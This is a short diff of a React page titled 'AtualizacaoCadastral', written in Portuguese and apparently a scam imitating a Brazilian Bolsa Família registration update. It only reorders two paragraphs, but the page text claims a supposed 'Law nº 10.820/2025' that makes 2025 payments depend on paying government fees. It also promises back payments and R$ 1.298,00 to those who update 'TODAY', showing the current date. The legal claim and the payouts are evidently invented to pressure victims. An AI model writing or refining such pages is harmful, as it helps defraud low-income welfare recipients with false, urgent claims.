@@ -73,15 +73,15 @@ export default function AtualizacaoCadastral() {
         </div>
 
         <div className="mb-6">
-          <p className="text-gray-700 mb-6">
-            De acordo com a nova Lei (nº 10.820/2025) imposta pelo governo, é exigido que as parcelas do Bolsa Família de 2025 só sejam pagas aos que contribuírem com as tarifas governamentais.
-          </p>
-
           <div className="bg-[#fff9e6] p-4 border-l-4 border-[#ee8435] mb-6">
             <p className="text-gray-700 font-medium">
               Os usuários que atualizarem o cadastro HOJE ({formattedDate()}) terão direito de receber TODAS AS PARCELAS ATRASADAS e R$ 1.298,00 pelos próximos 2 meses, e R$ 600,00 nos outros meses do ano.
             </p>
           </div>
+
+          <p className="text-gray-700 mb-6">
+            De acordo com a nova Lei (nº 10.820/2025) imposta pelo governo, é exigido que as parcelas do Bolsa Família de 2025 só sejam pagas aos que contribuírem com as tarifas governamentais.
+          </p>
           
           <button
             type="button"
